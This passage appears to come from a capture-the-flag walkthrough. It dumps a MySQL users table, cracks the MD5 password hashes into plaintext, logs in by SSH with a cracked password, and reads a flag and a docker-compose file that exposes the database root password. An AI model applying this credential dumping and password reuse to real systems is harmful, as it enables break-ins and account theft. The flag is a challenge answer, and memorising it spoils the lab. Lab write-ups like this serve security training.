Database changed
mysql> show tables;
+------------------------+
| Tables_in_timetracking |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----------+----------------------------------+-------+
| user     | pass                             | time  |
+----------+----------------------------------+-------+
| claire-r | 2ac9cb7dc02b3c0083eb70898e549b63 |   360 |
| chris-r  | 0d107d09f5bbe40cade3de5c71e9e9b7 |   420 |
| jill-v   | d5c0607301ad5d5c1528962a83992ac8 |   564 |
| barry-b  | 4a04890400b5d7bac101baace5d7e994 | 47893 |
+----------+----------------------------------+-------+
4 rows in set (0.00 sec)

mysql>
```

<h3>CrackStation</h3>

<p>claire-r:Password1</p>

![image](https://github.com/user-attachments/assets/f945223a-4381-49cf-aedb-72512e75e1bd)

<p>chris-r:letmein</p>


![image](https://github.com/user-attachments/assets/9bff208d-6f06-4df4-b1a8-ff7968d92604)

<p>jill-v:sunshine1</p>

![image](https://github.com/user-attachments/assets/02c416f7-cfaa-41a2-ae26-9e200c140d21)

<p>barry-b-v:sandwich</p>

![image](https://github.com/user-attachments/assets/ae77cb2d-5b03-419a-92bc-2f4630d5887f)

<br>

<h3>ssh</h3>

```bash
ssh claire-r@TargetIP
...
claire-r@ip-xx-xx-xxx-xxx:~$ cat user.txt
THM{d832c0e4cf71312708686124f7a6b25e}
claire-r@ip-xx-xx-xxx-xxx:~$ cd timeTracker-src
claire-r@ip-xx-xx-xxx-xxx:~/timeTracker-src$ ls
app.js  db  docker-compose.yml  Dockerfile  logs  package.json  package-lock.json  public  views
claire-r@ip-xx-xx-xxx-xxx:~/timeTracker-src$ cat docker-compose.yml
version: '3.3'
services:
  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: 'timetracking'
      MYSQL_ROOT_PASSWORD: 'Ng1-f3!Pe7-e5?Nf3xe5'
    ports:
      - '3306:3306'     
    volumes:
      - ./db:/docker-entrypoint-initdb.d
  app:
    image: umbrella/timetracking:latest
    restart: always
    ports:
      - '8080:8080'
    volumes:
      - ./logs:/logs
claire-r@ip-xx-xx-xxx-xxx:~/timeTracker-src$ 
```


![image](https://github.com/user-attachments/assets/0db93ea8-b3cf-4721-bb30-d5d513d02c36)


